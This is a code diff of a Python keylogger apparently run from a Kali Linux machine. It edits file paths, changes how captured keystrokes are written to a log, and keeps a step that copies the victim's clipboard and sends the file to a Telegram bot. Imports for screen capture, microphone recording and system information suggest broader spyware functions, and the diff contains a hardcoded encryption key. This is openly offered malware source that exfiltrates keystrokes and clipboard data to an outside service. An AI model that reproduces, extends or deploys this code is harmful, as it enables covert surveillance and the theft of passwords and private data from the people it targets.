@@ -7,7 +7,7 @@ from PIL import ImageGrab
 import getpass
 import socket
 import platform
-import  pyperclip
+import pyperclip
 from scipy.io.wavfile import write
 import sounddevice as sd
 from requests import get
@@ -33,8 +33,8 @@ username = getpass.getuser()
 
 key = "jmJ1hppnj8npXmYe13w3nUBH3KfUClQu0PLWS1VvTHk="
 
-file_path = "D:\\python project\\pythonProject\\python"
-extend = "\\"
+file_path = "/home/kali/Downloads/keylogger"
+extend = "/"
 file_merge = file_path + extend
 
 # Initialize global variables
@@ -83,9 +83,9 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
-                f.write(' ')
+                f.write('\n')
             elif k.find("Key") == -1:
-                f.write(k)
+                f.write(k + '\n')
 
 def on_release(key):
     global currentTime, stoppingTime, number_of_iterations, logging_active
@@ -149,8 +149,6 @@ def copy_clipboard():
         except Exception as e:
             f.write("Clipboard could not be copied\n")
             f.write(f"Error: {e}\n")
-
-    
 
     send_file_via_telegram(file_path, clipboard_information, chat_id, bot_token)
 
